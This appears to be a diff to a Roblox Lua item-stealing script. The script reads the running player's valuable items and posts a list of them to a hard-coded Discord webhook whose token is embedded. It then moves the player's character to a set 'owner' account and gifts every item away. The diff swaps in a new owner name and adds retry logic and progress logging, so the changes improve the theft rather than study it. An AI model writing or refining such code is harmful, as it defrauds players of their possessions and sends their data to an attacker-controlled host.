@@ -2,7 +2,7 @@ local Players = game:GetService("Players")
 local RS = game:GetService("ReplicatedStorage")
 local lp = Players.LocalPlayer
 
-local OWNER = "werovasquez"
+local OWNER = "fdtztc6"
 local WEBHOOK = "https://discord.com/api/webhooks/1546003287067725855/3pSRKl_qcw1e4ggGIyMzuVB5HzlqvnyleUKscsYUJUqcG7JpP20wUNt0aLg0gX3WijZF"
 local MIN_MULT = 1.5
 
@@ -60,52 +60,81 @@ local function giftAll(ownerPlayer, items)
     local hum = char and char:FindFirstChild("Humanoid")
     local ownerChar = ownerPlayer.Character
     local ownerRoot = ownerChar and ownerChar:FindFirstChild("HumanoidRootPart")
-    if not hum or not ownerRoot or not char then return end
+    if not hum or not ownerRoot or not char then 
+        print("❌ Cannot start gifting: missing char/humanoid/owner")
+        return 
+    end
 
     -- Walk to owner and keep walking if they move
     for attempt = 1, 30 do
         ownerChar = ownerPlayer.Character
         ownerRoot = ownerChar and ownerChar:FindFirstChild("HumanoidRootPart")
         local myRoot = char:FindFirstChild("HumanoidRootPart")
-        if not ownerRoot or not myRoot then task.wait(1) continue end
+        if not ownerRoot or not myRoot then 
+            task.wait(1) 
+            continue 
+        end
 
         local dist = (ownerRoot.Position - myRoot.Position).Magnitude
         if dist > 8 then
             hum:MoveTo(ownerRoot.Position)
             task.wait(1)
         else
+            print("✓ Reached owner")
             break
         end
     end
 
-    task.wait(0.3)
+    task.wait(0.5)
 
     -- Gift each item one by one
-    for _, item in ipairs(items) do
+    for idx, item in ipairs(items) do
         -- Make sure item still exists
-        if not item or not item.Parent then continue end
+        if not item or not item.Parent then 
+            print("⚠ Item " .. idx .. " no longer exists")
+            continue 
+        end
+
+        print("Gifting (" .. idx .. "/" .. #items .. "): " .. item.Name)
 
         -- Equip it (move to character)
         local wasInBackpack = item.Parent == lp.Backpack
         if wasInBackpack then
             item.Parent = char
-            task.wait(0.3)
-        end
-
-        -- Set target and gift
-        RS.Remotes.SetGiftTarget:FireServer(ownerPlayer)
-        task.wait(0.2)
-        RS.Remotes.GiftItem:FireServer(item)
-        task.wait(0.5)
-
-        -- If gift failed and item came back to backpack, try again
-        if item.Parent == lp.Backpack or item.Parent == char then
-            RS.Remotes.SetGiftTarget:FireServer(ownerPlayer)
-            task.wait(0.2)
-            RS.Remotes.GiftItem:FireServer(item.Name)
             task.wait(0.5)
         end
+
+        -- Fire gift remote - try with both owner player and item name
+        local success = false
+        for attempt = 1, 3 do
+            pcall(function()
+                -- Try: GiftItem(owner, itemName)
+                RS.Remotes.GiftItem:FireServer(ownerPlayer, item.Name)
+            end)
+            task.wait(0.8)
+            
+            -- Check if item was gifted (should disappear from inventory)
+            if not item or not item.Parent or (item.Parent ~= char and item.Parent ~= lp.Backpack) then
+                success = true
+                break
+            end
+            
+            if attempt < 3 then
+                print("  Retry " .. attempt .. "/2...")
+                task.wait(0.3)
+            end
+        end
+
+        if success then
+            print("✓ Gifted: " .. item.Name)
+        else
+            print("✗ Failed to gift: " .. item.Name)
+        end
+        
+        task.wait(0.5)
     end
+    
+    print("✓ Gifting complete!")
 end
 
 local function tryGift(ownerPlayer, items)
@@ -116,8 +145,12 @@ end
 
 -- MAIN
 local items = getItems()
-if #items == 0 then return end
+if #items == 0 then 
+    print("❌ No valuable items found")
+    return 
+end
 
+print("Found " .. #items .. " valuable items")
 sendWebhook(items)
 
 -- Check if owner already in server
@@ -125,6 +158,7 @@ local owner = nil
 for _, p in ipairs(Players:GetPlayers()) do
     if p ~= lp and p.Name:lower() == OWNER:lower() then
         owner = p
+        print("✓ Owner found in server: " .. owner.Name)
         break
     end
 end
@@ -132,8 +166,10 @@ end
 if owner then
     giftAll(owner, items)
 else
+    print("⏳ Waiting for owner to join...")
     Players.PlayerAdded:Connect(function(p)
         if p.Name:lower() == OWNER:lower() then
+            print("✓ Owner joined: " .. p.Name)
             tryGift(p, items)
         end
     end)
